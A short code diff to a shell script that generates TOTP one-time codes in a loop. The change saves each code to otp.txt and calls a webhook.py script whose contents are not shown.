@@ -24,7 +24,9 @@ file=$(cat $path)
 
 for (( ; ; ))
 do
+   python3 mintotp.py <<< $file > otp.txt
    python3 mintotp.py <<< $file
+   python3 webhook.py 
    sleep 30
 done
 }
@@ -35,7 +37,9 @@ piyush0() {
 read -p "Enter Secret Key : " key
 for (( ; ; ))
 do
+   python3 mintotp.py <<< $key > otp.txt
    python3 mintotp.py <<< $key
+   python3 webhook.py
    sleep 30
 done
 
@@ -51,7 +55,9 @@ echo $key > $name
 
 for (( ; ; ))
 do
+   python3 mintotp.py <<< $key > otp.txt
    python3 mintotp.py <<< $key
+   python3 webhook.py
    sleep 30
 done
 
